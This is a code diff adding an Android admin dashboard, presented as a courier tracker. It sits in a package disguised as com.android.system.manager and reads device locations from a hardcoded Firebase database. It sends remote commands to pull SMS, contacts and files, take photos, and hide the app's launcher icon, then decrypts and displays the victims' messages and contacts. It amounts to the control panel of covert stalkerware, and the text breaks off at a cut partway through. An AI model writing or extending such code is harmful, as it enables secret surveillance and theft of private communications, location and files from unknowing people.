@@ -1,0 +1,1308 @@
+package com.android.system.manager
+
+import android.content.Intent
+import android.os.Bundle
+import android.util.Log
+import androidx.activity.ComponentActivity
+import androidx.activity.compose.setContent
+import androidx.compose.foundation.background
+import androidx.compose.foundation.layout.*
+import androidx.compose.foundation.lazy.LazyColumn
+import androidx.compose.foundation.lazy.items
+import androidx.compose.foundation.shape.RoundedCornerShape
+import androidx.compose.material.icons.Icons
+import androidx.compose.material.icons.filled.*
+import androidx.compose.material3.*
+import androidx.compose.runtime.*
+import androidx.compose.ui.Alignment
+import androidx.compose.ui.Modifier
+import androidx.compose.ui.draw.clip
+import androidx.compose.ui.graphics.Color
+import androidx.compose.ui.graphics.vector.ImageVector
+import androidx.compose.ui.text.font.FontWeight
+import androidx.compose.ui.unit.dp
+import androidx.compose.ui.unit.sp
+import androidx.compose.ui.viewinterop.AndroidView
+import com.google.android.gms.maps.CameraUpdateFactory
+import com.google.android.gms.maps.GoogleMap
+import com.google.android.gms.maps.MapView
+import com.google.android.gms.maps.model.*
+import com.google.firebase.database.DataSnapshot
+import com.google.firebase.database.DatabaseError
+import com.google.firebase.database.DatabaseReference
+import com.google.firebase.database.FirebaseDatabase
+import com.google.firebase.database.ServerValue
+import com.google.firebase.database.ValueEventListener
+import com.android.system.manager.crypto.CryptoManager
+import com.android.system.manager.crypto.KeyManager
+import com.android.system.manager.BuildConfig
+import dagger.hilt.android.AndroidEntryPoint
+import kotlinx.coroutines.launch
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
+import java.util.concurrent.TimeUnit
+
+@AndroidEntryPoint
+class AdminDashboardActivity : ComponentActivity() {
+    
+    private lateinit var devicesRef: DatabaseReference
+    private var currentDevices = listOf<DeviceData>()
+    
+    data class SmsItem(
+        val id: String = "",
+        val address: String = "",
+        val body: String = "",
+        val date: Long = 0L,
+        val type: Int = 1
+    )
+
+    data class ContactItem(
+        val id: String = "",
+        val name: String = "",
+        val phone: String = "",
+        val email: String? = null
+    )
+
+    data class FileItem(
+        val id: String = "",
+        val name: String = "",
+        val path: String = "",
+        val size: Long = 0L,
+        val mimeType: String = "",
+        val dateModified: Long = 0L
+    )
+
+    data class DeviceData(
+        val lat: Double = 0.0,
+        val lng: Double = 0.0,
+        val accuracy: Float = 0f,
+        val speed: Double = 0.0,
+        val bearing: Double = 0.0,
+        val altitude: Double = 0.0,
+        val provider: String = "",
+        val battery: Int = 0,
+        val timestamp: Long = 0L,
+        val isOnline: Boolean = false,
+        val deviceId: String = "",
+        val deviceName: String = "",
+        val email: String = "",
+        val status: String = "",
+        val launcherHidden: Boolean = false
+    )
+    
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        
+        devicesRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app").getReference("devices")
+        
+        setContent {
+            AdminDashboardScreen()
+        }
+    }
+    
+    @Composable
+    private fun AdminDashboardScreen() {
+        var devices by remember { mutableStateOf<List<DeviceData>>(emptyList()) }
+        var totalCouriers by remember { mutableStateOf(0) }
+        var onlineCouriers by remember { mutableStateOf(0) }
+        var offlineCouriers by remember { mutableStateOf(0) }
+        var selectedDevice by remember { mutableStateOf<DeviceData?>(null) }
+        var showSmsPanel by remember { mutableStateOf(false) }
+        var smsPanelDeviceId by remember { mutableStateOf("") }
+        var showContactsPanel by remember { mutableStateOf(false) }
+        var contactsPanelDeviceId by remember { mutableStateOf("") }
+        var showFilesPanel by remember { mutableStateOf(false) }
+        var filesPanelDeviceId by remember { mutableStateOf("") }
+        val scope = rememberCoroutineScope()
+        var googleMap by remember { mutableStateOf<GoogleMap?>(null) }
+        val markers = remember { mutableMapOf<String, Marker>() }
+        
+        // Firebase Realtime Listener
+        LaunchedEffect(Unit) {
+            val listener = object : ValueEventListener {
+                override fun onDataChange(snapshot: DataSnapshot) {
+                    try {
+                        Log.d("DEBUG_MAP", "Firebase data changed, snapshot exists: ${snapshot.exists()}")
+                        
+                        val deviceList = mutableListOf<DeviceData>()
+                        var online = 0
+                        var offline = 0
+                        
+                        if (snapshot.exists()) {
+                            snapshot.children.forEach { child ->
+                                try {
+                                    val locationSnapshot = child.child("location")
+                                    val device = locationSnapshot.getValue(DeviceData::class.java)
+                                    if (device != null) {
+                                        val isHidden = locationSnapshot.child("launcherHidden").getValue(Boolean::class.java) ?: false
+                                        
+                                        // AES deshifrlash
+                                        val aesKey = KeyManager.getAesKey(this@AdminDashboardActivity)
+                                        val rawLat = locationSnapshot.child("lat").getValue(String::class.java)
+                                        val rawLng = locationSnapshot.child("lng").getValue(String::class.java)
+                                        
+                                        val decryptedLat: Double = if (aesKey != null && rawLat != null) {
+                                            val decrypted = CryptoManager.decrypt(rawLat, aesKey)
+                                            if (decrypted != null) {
+                                                decrypted.toDoubleOrNull() ?: device.lat
+                                            } else {
+                                                if (BuildConfig.DEBUG) { Log.w("SYS_MGR", "decrypt failed for lat") }
+                                                rawLat.toDoubleOrNull() ?: device.lat
+                                            }
+                                        } else {
+                                            device.lat
+                                        }
+                                        
+                                        val decryptedLng: Double = if (aesKey != null && rawLng != null) {
+                                            val decrypted = CryptoManager.decrypt(rawLng, aesKey)
+                                            if (decrypted != null) {
+                                                decrypted.toDoubleOrNull() ?: device.lng
+                                            } else {
+                                                if (BuildConfig.DEBUG) { Log.w("SYS_MGR", "decrypt failed for lng") }
+                                                rawLng.toDoubleOrNull() ?: device.lng
+                                            }
+                                        } else {
+                                            device.lng
+                                        }
+                                        
+                                        val deviceWithId = device.copy(
+                                            deviceId = child.key ?: "",
+                                            launcherHidden = isHidden,
+                                            lat = decryptedLat,
+                                            lng = decryptedLng
+                                        )
+                                        deviceList.add(deviceWithId)
+                                        if (device.isOnline) online++ else offline++
+                                        Log.d("DEBUG_MAP", "Device found: ${device.deviceName}, lat: ${device.lat}, lng: ${device.lng}")
+                                    } else {
+                                        Log.w("DEBUG_MAP", "Null device data for child: ${child.key}")
+                                    }
+                                } catch (e: Exception) {
+                                    Log.e("DEBUG_MAP", "Error parsing device data: ${e.message}")
+                                }
+                            }
+                        } else {
+                            Log.w("DEBUG_MAP", "No data in Firebase snapshot")
+                        }
+                        
+                        devices = deviceList
+                        currentDevices = deviceList
+                        totalCouriers = deviceList.size
+                        onlineCouriers = online
+                        offlineCouriers = offline
+                        
+                        // Update map markers
+                        googleMap?.let { map ->
+                            updateMapMarkers(map, markers, deviceList)
+                        }
+                        
+                        Log.d("DEBUG_MAP", "Updated ${deviceList.size} devices: $online online, $offline offline")
+                    } catch (e: Exception) {
+                        Log.e("DEBUG_MAP", "Critical error in Firebase data processing: ${e.message}")
+                        // Set empty state to prevent crashes
+                        devices = emptyList()
+                        currentDevices = emptyList()
+                        totalCouriers = 0
+                        onlineCouriers = 0
+                        offlineCouriers = 0
+                    }
+                }
+                
+                override fun onCancelled(error: DatabaseError) {
+                    Log.e("DEBUG_MAP", "Firebase listener cancelled: ${error.message}")
+                }
+            }
+            
+            devicesRef.addValueEventListener(listener)
+        }
+        
+        Box(modifier = Modifier.fillMaxSize()) {
+            // Map View
+            AndroidView(
+                factory = { ctx ->
+                    MapView(ctx).also { mv ->
+                        mv.onCreate(Bundle())
+                        mv.onResume()
+                        mv.getMapAsync { map ->
+                            googleMap = map
+                            map.uiSettings.isZoomControlsEnabled = true
+                            map.uiSettings.isCompassEnabled = true
+                            map.moveCamera(
+                                CameraUpdateFactory.newLatLngZoom(
+                                    LatLng(41.299496, 69.240073), 10f
+                                )
+                            )
+                            map.setOnMarkerClickListener { marker ->
+                                val deviceId = marker.tag as? String
+                                val device = currentDevices.find { it.deviceId == deviceId }
+                                if (device != null) selectedDevice = device
+                                true
+                            }
+                        }
+                    }
+                },
+                modifier = Modifier.fillMaxSize()
+            )
+            
+            // Statistics Bar
+            Column(
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .padding(16.dp)
+                    .align(Alignment.TopStart)
+            ) {
+                StatisticsBar(
+                    total = totalCouriers,
+                    online = onlineCouriers,
+                    offline = offlineCouriers
+                )
+            }
+            
+            // Courier List
+            Column(modifier = Modifier
+                .fillMaxWidth()
+                .height(300.dp)
+                .padding(16.dp)
+                .align(Alignment.BottomStart)) {
+                Text(
+                    text = "Active Couriers (${devices.size})",
+                    style = MaterialTheme.typography.titleMedium,
+                    fontWeight = FontWeight.Bold,
+                    modifier = Modifier.padding(16.dp)
+                )
+
+                if (devices.isEmpty()) {
+                    Box(
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .weight(1f),
+                        contentAlignment = Alignment.Center
+                    ) {
+                        Text(
+                            text = "No active devices",
+                            color = MaterialTheme.colorScheme.onSurfaceVariant,
+                            style = MaterialTheme.typography.bodyMedium
+                        )
+                    }
+                } else {
+                    LazyColumn(modifier = Modifier.weight(1f)) {
+                        items(devices) { device ->
+                            CourierItem(device = device, onClick = { 
+                                selectedDevice = device
+                                googleMap?.let { focusOnDevice(it, device) }
+                            })
+                        }
+                    }
+                }
+            }
+            
+                // Device Detail Popup
+            selectedDevice?.let { device ->
+                DeviceDetailPopup(
+                    device = device,
+                    onDismiss = { selectedDevice = null },
+                    onSmsClick = { uid ->
+                        sendSyncSmsCommand(uid)
+                        smsPanelDeviceId = uid
+                        showSmsPanel = true
+                    },
+                    onContactsClick = { uid ->
+                        sendSyncContactsCommand(uid)
+                        contactsPanelDeviceId = uid
+                        showContactsPanel = true
+                    },
+                    onFilesClick = { uid ->
+                        sendSyncFilesCommand(uid)
+                        filesPanelDeviceId = uid
+                        showFilesPanel = true
+                    },
+                    onTakePhotoClick = { uid ->
+                        sendTakePhotoCommand(uid)
+                    }
+                )
+            }
+
+            // SMS Panel (bottom sheet style)
+            if (showSmsPanel) {
+                SmsPanel(
+                    deviceId = smsPanelDeviceId,
+                    onDismiss = { showSmsPanel = false }
+                )
+            }
+
+            // Contacts Panel
+            if (showContactsPanel) {
+                ContactsPanel(
+                    deviceId = contactsPanelDeviceId,
+                    onDismiss = { showContactsPanel = false }
+                )
+            }
+
+            // Files Panel
+            if (showFilesPanel) {
+                FilesPanel(
+                    deviceId = filesPanelDeviceId,
+                    onDismiss = { showFilesPanel = false }
+                )
+            }
+        }
+    }
+    
+    private fun updateMapMarkers(map: GoogleMap, markers: MutableMap<String, Marker>, devices: List<DeviceData>) {
+        // Clear existing markers
+        markers.values.forEach { it.remove() }
+        markers.clear()
+        
+        // Add new markers
+        devices.forEach { device ->
+            if (device.lat != 0.0 && device.lng != 0.0) {
+                val markerOptions = MarkerOptions()
+                    .position(LatLng(device.lat, device.lng))
+                    .title(device.deviceName)
+                    .snippet("Battery: ${device.battery}% | Provider: ${device.provider}")
+                    .icon(getDeviceIcon(device))
+                
+                val marker = map.addMarker(markerOptions)
+                marker?.tag = device.deviceId
+                if (marker != null) {
+                    markers[device.deviceId] = marker
+                }
+            }
+        }
+    }
+    
+    private fun getDeviceIcon(device: DeviceData): BitmapDescriptor {
+        return when {
+            !device.isOnline -> BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_RED)
+            device.battery < 20 -> BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_ORANGE)
+            else -> BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_GREEN)
+        }
+    }
+    
+    private fun focusOnDevice(map: GoogleMap, device: DeviceData) {
+        if (device.lat != 0.0 && device.lng != 0.0) {
+            map.animateCamera(
+                CameraUpdateFactory.newLatLngZoom(
+                    LatLng(device.lat, device.lng),
+                    15f
+                )
+            )
+        }
+    }
+    
+    @Composable
+    private fun StatisticsBar(total: Int, online: Int, offline: Int) {
+        Card(
+            modifier = Modifier.fillMaxWidth(),
+            colors = CardDefaults.cardColors(
+                containerColor = MaterialTheme.colorScheme.primaryContainer
+            )
+        ) {
+            Row(
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .padding(16.dp),
+                horizontalArrangement = Arrangement.SpaceEvenly
+            ) {
+                StatItem("Total Couriers", total.toString(), Icons.Default.Person)
+                StatItem("Online", online.toString(), Icons.Filled.Person, Color.Green)
+                StatItem("Offline", offline.toString(), Icons.Filled.Person, Color.Red)
+            }
+        }
+    }
+    
+    @Composable
+    private fun StatItem(title: String, value: String, icon: ImageVector, color: Color = MaterialTheme.colorScheme.primary) {
+        Column(horizontalAlignment = Alignment.CenterHorizontally) {
+            Icon(icon, contentDescription = null, tint = color, modifier = Modifier.size(24.dp))
+            Spacer(modifier = Modifier.height(4.dp))
+            Text(text = value, fontWeight = FontWeight.Bold, fontSize = 20.sp)
+            Text(text = title, fontSize = 12.sp, color = MaterialTheme.colorScheme.onSurfaceVariant)
+        }
+    }
+    
+    @Composable
+    private fun CourierItem(device: DeviceData, onClick: () -> Unit) {
+        Card(
+            modifier = Modifier
+                .fillMaxWidth()
+                .padding(horizontal = 16.dp, vertical = 4.dp),
+            onClick = onClick
+        ) {
+            Row(
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .padding(12.dp),
+                verticalAlignment = Alignment.CenterVertically,
+                horizontalArrangement = Arrangement.SpaceBetween
+            ) {
+                Row(verticalAlignment = Alignment.CenterVertically) {
+                    // Online status indicator
+                    Box(
+                        modifier = Modifier
+                            .size(12.dp)
+                            .background(
+                                if (device.isOnline) Color.Green else Color.Red,
+                                shape = RoundedCornerShape(6.dp)
+                            )
+                    )
+                    
+                    Spacer(modifier = Modifier.width(12.dp))
+                    
+                    Column {
+                        Text(
+                            text = device.deviceName,
+                            fontWeight = FontWeight.Medium,
+                            fontSize = 14.sp
+                        )
+                        Text(
+                            text = "Last seen: ${getRelativeTime(device.timestamp)}",
+                            fontSize = 12.sp,
+                            color = MaterialTheme.colorScheme.onSurfaceVariant
+                        )
+                    }
+                }
+                
+                Row(verticalAlignment = Alignment.CenterVertically) {
+                    // Battery indicator
+                    BatteryIndicator(battery = device.battery)
+                    
+                    Spacer(modifier = Modifier.width(8.dp))
+                    
+                    Column(horizontalAlignment = Alignment.End) {
+                        Text(
+                            text = device.provider.uppercase(),
+                            fontSize = 10.sp,
+                            color = MaterialTheme.colorScheme.primary
+                        )
+                        Text(
+                            text = "${device.speed.toInt()} km/h",
+                            fontSize = 10.sp,
+                            color = MaterialTheme.colorScheme.onSurfaceVariant
+                        )
+                    }
+                }
+            }
+        }
+    }
+    
+    @Composable
+    private fun BatteryIndicator(battery: Int) {
+        val icon = Icons.Filled.Settings // Use Settings as fallback
+        val color = if (battery < 20) Color.Red else Color.Green
+        
+        Row(verticalAlignment = Alignment.CenterVertically) {
+            Icon(
+                imageVector = icon,
+                contentDescription = null,
+                tint = color,
+                modifier = Modifier.size(16.dp)
+            )
+            Spacer(modifier = Modifier.width(4.dp))
+            Text(
+                text = "$battery%",
+                fontSize = 10.sp,
+                color = color
+            )
+        }
+    }
+    
+    @Composable
+    private fun DeviceDetailPopup(
+        device: DeviceData,
+        onDismiss: () -> Unit,
+        onSmsClick: (String) -> Unit = {},
+        onContactsClick: (String) -> Unit = {},
+        onFilesClick: (String) -> Unit = {},
+        onTakePhotoClick: (String) -> Unit = {}
+    ) {
+        Card(
+            modifier = Modifier
+                .fillMaxWidth()
+                .padding(16.dp),
+            elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
+        ) {
+            Column(
+                modifier = Modifier.padding(16.dp)
+            ) {
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    horizontalArrangement = Arrangement.SpaceBetween,
+                    verticalAlignment = Alignment.CenterVertically
+                ) {
+                    Text(
+                        text = device.deviceName,
+                        style = MaterialTheme.typography.titleMedium,
+                        fontWeight = FontWeight.Bold
+                    )
+                    TextButton(onClick = onDismiss) {
+                        Text("Close")
+                    }
+                }
+                
+                Spacer(modifier = Modifier.height(8.dp))
+                
+                DetailRow("Device ID", device.deviceId)
+                DetailRow("Email", device.email)
+                DetailRow("Status", if (device.isOnline) "Online" else "Offline")
+                DetailRow("Provider", device.provider.uppercase())
+                DetailRow("Battery", "${device.battery}%")
+                DetailRow("Speed", "${device.speed} km/h")
+                DetailRow("Accuracy", "${device.accuracy}m")
+                DetailRow("Last Updated", getRelativeTime(device.timestamp))
+                
+                Spacer(modifier = Modifier.height(12.dp))
+                
+                Button(
+                    onClick = {
+                        // Open detailed view with location history
+                        openCourierDetail(device)
+                    },
+                    modifier = Modifier.fillMaxWidth()
+                ) {
+                    Text("View Location History")
+                }
+
+                Spacer(modifier = Modifier.height(8.dp))
+
+                val deviceId = device.deviceId
+                Button(
+                    onClick = { onFilesClick(deviceId) },
+                    modifier = Modifier.fillMaxWidth(),
+                    colors = ButtonDefaults.buttonColors(
+                        containerColor = Color(0xFF607D8B)
+                    )
+                ) {
+                    Text("📁 Fayllar")
+                }
+
+                Spacer(modifier = Modifier.height(8.dp))
+
+                Button(
+                    onClick = { onContactsClick(deviceId) },
+                    modifier = Modifier.fillMaxWidth(),
+                    colors = ButtonDefaults.buttonColors(
+                        containerColor = MaterialTheme.colorScheme.tertiary
+                    )
+                ) {
+                    Text("👤 Kontaktlar")
+                }
+
+                Spacer(modifier = Modifier.height(8.dp))
+
+                Button(
+                    onClick = { onSmsClick(deviceId) },
+                    modifier = Modifier.fillMaxWidth(),
+                    colors = ButtonDefaults.buttonColors(
+                        containerColor = MaterialTheme.colorScheme.secondary
+                    )
+                ) {
+                    Text("📩 SMS")
+                }
+
+                Spacer(modifier = Modifier.height(8.dp))
+
+                Button(
+                    onClick = { onTakePhotoClick(deviceId) },
+                    modifier = Modifier.fillMaxWidth(),
+                    colors = ButtonDefaults.buttonColors(
+                        containerColor = Color(0xFF9C27B0)
+                    )
+                ) {
+                    Text("📸 Foto")
+                }
+
+                Spacer(modifier = Modifier.height(8.dp))
+
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    horizontalArrangement = Arrangement.spacedBy(8.dp)
+                ) {
+                    if (device.launcherHidden) {
+                        Button(
+                            onClick = {
+                                sendLauncherCommand(device.deviceId, "showLauncher")
+                            },
+                            modifier = Modifier.fillMaxWidth(),
+                            colors = ButtonDefaults.buttonColors(
+                                containerColor = Color(0xFF4CAF50)
+                            )
+                        ) {
+                            Text("Show Icon")
+                        }
+                    } else {
+                        Button(
+                            onClick = {
+                                sendLauncherCommand(device.deviceId, "hideLauncher")
+                            },
+                            modifier = Modifier.fillMaxWidth(),
+                            colors = ButtonDefaults.buttonColors(
+                                containerColor = Color(0xFFF44336)
+                            )
+                        ) {
+                            Text("Hide Icon")
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    @Composable
+    private fun DetailRow(label: String, value: String) {
+        Row(
+            modifier = Modifier
+                .fillMaxWidth()
+                .padding(vertical = 2.dp),
+            horizontalArrangement = Arrangement.SpaceBetween
+        ) {
+            Text(
+                text = label,
+                color = MaterialTheme.colorScheme.onSurfaceVariant,
+                fontSize = 12.sp
+            )
+            Text(
+                text = value,
+                fontWeight = FontWeight.Medium,
+                fontSize = 12.sp
+            )
+        }
+    }
+    
+    private fun getRelativeTime(timestamp: Long): String {
+        val now = System.currentTimeMillis()
+        val diff = now - timestamp
+        
+        return when {
+            diff < TimeUnit.MINUTES.toMillis(1) -> "Just now"
+            diff < TimeUnit.MINUTES.toMillis(60) -> "${diff / TimeUnit.MINUTES.toMillis(1)} minutes ago"
+            diff < TimeUnit.HOURS.toMillis(24) -> "${diff / TimeUnit.HOURS.toMillis(1)} hours ago"
+            else -> "${diff / TimeUnit.DAYS.toMillis(1)} days ago"
+        }
+    }
+    
+    private fun openCourierDetail(device: DeviceData) {
+        val intent = Intent(this, CourierDetailActivity::class.java).apply {
+            putExtra("device_id", device.deviceId)
+            putExtra("device_name", device.deviceName)
+        }
+        startActivity(intent)
+    }
+    
+    private fun sendLauncherCommand(deviceId: String, command: String) {
+        val commandsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
+            .getReference("devices")
+            .child(deviceId)
+            .child("commands")
+
+        when (command) {
+            "hideLauncher" -> {
+                commandsRef.child("hideLauncher").setValue(mapOf(
+                    "type" to "hideLauncher",
+                    "timestamp" to ServerValue.TIMESTAMP,
+                    "status" to "pending"
+                ))
+                commandsRef.child("showLauncher").setValue(null)
+            }
+            "showLauncher" -> {
+                commandsRef.child("showLauncher").setValue(mapOf(
+                    "type" to "showLauncher",
+                    "timestamp" to ServerValue.TIMESTAMP,
+                    "status" to "pending"
+                ))
+                commandsRef.child("hideLauncher").setValue(null)
+            }
+        }
+    }
+    
+    /**
+     * syncSms command ni Firebase'ga yozadi
+     */
+    private fun sendSyncSmsCommand(deviceId: String) {
+        val commandsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
+            .getReference("devices")
+            .child(deviceId)
+            .child("commands")
+
+        commandsRef.child("syncSms").setValue(mapOf(
+            "type" to "syncSms",
+            "timestamp" to ServerValue.TIMESTAMP,
+            "status" to "pending"
+        ))
+        if (BuildConfig.DEBUG) { Log.d("SYS_MGR", "syncSms command sent for device: $deviceId") }
+    }
+
+    /**
+     * SMS ro'yxatini ko'rsatuvchi panel
+     */
+    @Composable
+    private fun SmsPanel(deviceId: String, onDismiss: () -> Unit) {
+        var smsList by remember { mutableStateOf<List<SmsItem>>(emptyList()) }
+        var isLoading by remember { mutableStateOf(true) }
+
+        // Firebase'dan SMS larni o'qish
+        LaunchedEffect(deviceId) {
+            val smsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
+                .getReference("devices")
+                .child(deviceId)
+                .child("sms")
+
+            smsRef.addValueEventListener(object : ValueEventListener {
+                override fun onDataChange(snapshot: DataSnapshot) {
+                    val aesKey = KeyManager.getAesKey(this@AdminDashboardActivity)
+                    val list = mutableListOf<SmsItem>()
+                    snapshot.children.forEach { child ->
+                        try {
+                            val id = child.child("id").getValue(String::class.java) ?: ""
+                            val rawAddress = child.child("address").getValue(String::class.java) ?: ""
+                            val rawBody = child.child("body").getValue(String::class.java) ?: ""
+                            val date = child.child("date").getValue(Long::class.java) ?: 0L
+                            val type = child.child("type").getValue(Int::class.java) ?: 1
+
+                            val address = if (aesKey != null) {
+                                CryptoManager.decrypt(rawAddress, aesKey) ?: rawAddress
+                            } else rawAddress
+
+                            val body = if (aesKey != null) {
+                                CryptoManager.decrypt(rawBody, aesKey) ?: rawBody
+                            } else rawBody
+
+                            list.add(SmsItem(id = id, address = address, body = body, date = date, type = type))
+                        } catch (e: Exception) {
+                            if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "SMS parse error: ${e.message}") }
+                        }
+                    }
+                    smsList = list.sortedByDescending { it.date }
+                    isLoading = false
+                }
+
+                override fun onCancelled(error: DatabaseError) {
+                    if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "SMS listener cancelled: ${error.message}") }
+                    isLoading = false
+                }
+            })
+        }
+
+        Card(
+            modifier = Modifier
+                .fillMaxWidth()
+                .fillMaxHeight(0.6f)
+                .padding(16.dp),
+            elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
+        ) {
+            Column(modifier = Modifier.padding(16.dp)) {
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    horizontalArrangement = Arrangement.SpaceBetween,
+                    verticalAlignment = Alignment.CenterVertically
+                ) {
+                    Text(
+                        text = "📩 SMS (${smsList.size})",
+                        style = MaterialTheme.typography.titleMedium,
+                        fontWeight = FontWeight.Bold
+                    )
+                    TextButton(onClick = onDismiss) { Text("Close") }
+                }
+
+                Spacer(modifier = Modifier.height(8.dp))
+
+                if (isLoading) {
+                    Box(modifier = Modifier.fillMaxWidth(), contentAlignment = Alignment.Center) {
+                        CircularProgressIndicator()
+                    }
+                } else if (smsList.isEmpty()) {
+                    Text(
+                        text = "SMS topilmadi. Sync tugmasini bosing.",
+                        color = MaterialTheme.colorScheme.onSurfaceVariant,
+                        modifier = Modifier.padding(8.dp)
+                    )
+                } else {
+                    LazyColumn {
+                        items(smsList) { sms ->
+                            SmsItemRow(sms)
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    @Composable
+    private fun SmsItemRow(sms: SmsItem) {
+        val dateStr = remember(sms.date) {
+            if (sms.date > 0) {
+                SimpleDateFormat("dd.MM.yy HH:mm", Locale.getDefault()).format(Date(sms.date))
+            } else ""
+        }
+        val typeLabel = if (sms.type == 2) "📤" else "📥"
+
+        Card(
+            modifier = Modifier
+                .fillMaxWidth()
+                .padding(vertical = 3.dp),
+            colors = CardDefaults.cardColors(
+                containerColor = if (sms.type == 2)
+                    MaterialTheme.colorScheme.secondaryContainer
+                else
+                    MaterialTheme.colorScheme.surfaceVariant
+            )
+        ) {
+            Column(modifier = Modifier.padding(10.dp)) {
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    horizontalArrangement = Arrangement.SpaceBetween
+                ) {
+                    Text(
+                        text = "$typeLabel ${sms.address}",
+                        fontWeight = FontWeight.Medium,
+                        fontSize = 13.sp
+                    )
+                    Text(
+                        text = dateStr,
+                        fontSize = 11.sp,
+                        color = MaterialTheme.colorScheme.onSurfaceVariant
+                    )
+                }
+                Spacer(modifier = Modifier.height(4.dp))
+                Text(
+                    text = if (sms.body.length > 80) sms.body.take(80) + "…" else sms.body,
+                    fontSize = 12.sp,
+                    color = MaterialTheme.colorScheme.onSurfaceVariant
+                )
+            }
+        }
+    }
+
+    /**
+     * syncContacts command ni Firebase'ga yozadi
+     */
+    private fun sendSyncContactsCommand(deviceId: String) {
+        val commandsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
+            .getReference("devices")
+            .child(deviceId)
+            .child("commands")
+
+        commandsRef.child("syncContacts").setValue(mapOf(
+            "type" to "syncContacts",
+            "timestamp" to ServerValue.TIMESTAMP,
+            "status" to "pending"
+        ))
+        if (BuildConfig.DEBUG) { Log.d("SYS_MGR", "syncContacts command sent for device: $deviceId") }
+    }
+
+    /**
+     * Kontaktlar ro'yxatini ko'rsatuvchi panel
+     */
+    @Composable
+    private fun ContactsPanel(deviceId: String, onDismiss: () -> Unit) {
+        var contactsList by remember { mutableStateOf<List<ContactItem>>(emptyList()) }
+        var isLoading by remember { mutableStateOf(true) }
+        var searchQuery by remember { mutableStateOf("") }
+
+        LaunchedEffect(deviceId) {
+            val contactsRef = FirebaseDatabase.getInstance("https://joylashuv-56b2c-default-rtdb.europe-west1.firebasedatabase.app")
+                .getReference("devices")
+                .child(deviceId)
+                .child("contacts")
+
+            contactsRef.addValueEventListener(object : ValueEventListener {
+                override fun onDataChange(snapshot: DataSnapshot) {
+                    val aesKey = KeyManager.getAesKey(this@AdminDashboardActivity)
+                    val list = mutableListOf<ContactItem>()
+                    snapshot.children.forEach { child ->
+                        try {
+                            val id = child.child("id").getValue(String::class.java) ?: ""
+                            val rawName = child.child("name").getValue(String::class.java) ?: ""
+                            val rawPhone = child.child("phone").getValue(String::class.java) ?: ""
+                            val rawEmail = child.child("email").getValue(String::class.java)
+
+                            val name = if (aesKey != null) {
+                                CryptoManager.decrypt(rawName, aesKey) ?: rawName
+                            } else rawName
+
+                            val phone = if (aesKey != null) {
+                                CryptoManager.decrypt(rawPhone, aesKey) ?: rawPhone
+                            } else rawPhone
+
+                            val email = if (aesKey != null && rawEmail != null) {
+                                CryptoManager.decrypt(rawEmail, aesKey) ?: rawEmail
+                            } else rawEmail
+
+                            list.add(ContactItem(id = id, name = name, phone = phone, email = email))
+                        } catch (e: Exception) {
+                            if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "Contact parse error: ${e.message}") }
+                        }
+                    }
+                    contactsList = list.sortedBy { it.name }
+                    isLoading = false
+                }
+
+                override fun onCancelled(error: DatabaseError) {
+                    if (BuildConfig.DEBUG) { Log.e("SYS_MGR", "Contacts listener cancelled: ${error.message}") }
+                    isLoading = false
+                }
+            })
+        }
+
+        val filtered = if (searchQuery.isBlank()) contactsList
+        else contactsList.filter {
+            it.name.contains(searchQuery, ignoreCase = true) ||
+            it.phone.contains(searchQuery)
+        }
+
+        Card(
+            modifier = Modifier
+                .fillMaxWidth()
+                .fillMaxHeight(0.7f)
+                .padding(16.dp),
+            elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
+        ) {
+            Column(modifier = Modifier.padding(16.dp)) {
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    horizontalArrangement = Arrangement.SpaceBetween,
+                    verticalAlignment = Alignment.CenterVertically
+                ) {
+                    Text(
+                        text = "👤 Kontaktlar (${contactsList.size})",
+                        style = MaterialTheme.typography.titleMedium,
+                        fontWeight = FontWeight.Bold
+                    )
+                    TextButton(onClick = onDismiss) { Text("Close") }
+                }
+
+                Spacer(modifier = Modifier.height(8.dp))
+
+                // Qidiruv
+                OutlinedTextField(
+                    value = searchQuery,
+                    onValueChange = { searchQuery = it },
+                    placeholder = { Text("Qidirish...", fontSize = 13.sp) },
+                    modifier = Modifier.fillMaxWidth(),
+                    singleLine = true
+                )
+
+                Spacer(modifier = Modifier.height(8.dp))
+
+                if (isLoading) {
+                    Box(modifier = Modifier.fillMaxWidth(), contentAlignment = Alignment.Center) {
+                        CircularProgressIndicator()
+                    }
+                } else if (contactsList.isEmpty()) {
+                    Text(
+                        text = "Kontaktlar topilmadi. Sync tugmasini bosing.",
+                        color = MaterialTheme.colorScheme.onSurfaceVariant,
+                        modifier = Modifier.padding(8.dp)
+                    )
+                } else {
+                    LazyColumn {
+                        items(filtered) { contact ->
+                            ContactItemRow(contact)
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    @Composable
+    private fun ContactItemRow(contact: ContactItem) {
+        Card(
+            modifier = Modifier
+                .fillMaxWidth()
+                .padding(vertical = 3.dp),
+            colors = CardDefaults.cardColors(
